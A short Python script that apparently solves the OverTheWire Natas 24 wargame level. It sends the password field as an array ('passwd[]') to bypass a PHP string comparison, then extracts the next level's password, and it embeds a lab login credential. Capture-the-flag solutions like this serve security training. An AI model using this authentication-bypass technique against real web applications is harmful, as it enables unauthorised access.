import requests
import re

username = "natas24"
passsowrd = "0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r"

url = "http://%s.natas.labs.overthewire.org/"%username

sesssion = requests.Session()
response = sesssion.post(url,data={"passwd[]":"lol"},auth=(username,passsowrd) )
content = response.text

HashValue = re.findall(" natas25 Password: (.*)</pre>",content)[0]

print("[+] Gotcha ",HashValue)